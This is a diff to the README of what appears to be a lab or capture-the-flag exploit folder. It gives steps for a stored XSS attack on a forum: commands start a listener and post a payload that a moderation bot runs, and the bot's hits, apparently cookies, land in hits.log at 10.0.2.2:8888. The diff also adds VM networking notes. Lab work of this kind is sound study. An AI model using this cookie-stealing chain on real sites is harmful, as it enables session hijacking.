@@ -27,13 +27,19 @@ Two resources in this folder:
 
 ```bash
 python3 xss-listener.py &        # start listener
-./post-payload.sh http://localhost:4942 bbeo32ucx0a65b8 <attacker_host>:8888 cookies_jdoe.txt
+./post-payload.sh http://localhost:4942 bbeo32ucx0a65b8 10.0.2.2:8888 cookies_jdoe.txt
 ```
+
+> The listener must be reachable from the bot's vantage — see the Environment
+> note in [`../walkthrough.md`](../walkthrough.md). Current setup: the bot
+> runs inside a VirtualBox NAT VM and the operator on the host, so
+> `10.0.2.2:8888` is the address to pass; `127.0.0.1` only works if the bot
+> and the operator share a network namespace.
 
 `hits.log` is created in the current working directory; stop the listener
 with `kill %1`.
 
-Within ~2 minutes the moderation bot visits the thread, executes the payload,
+Within 1–2 minutes the moderation bot visits the thread, executes the payload,
 and the listener appends one line per hit to `hits.log`:
 
 ```
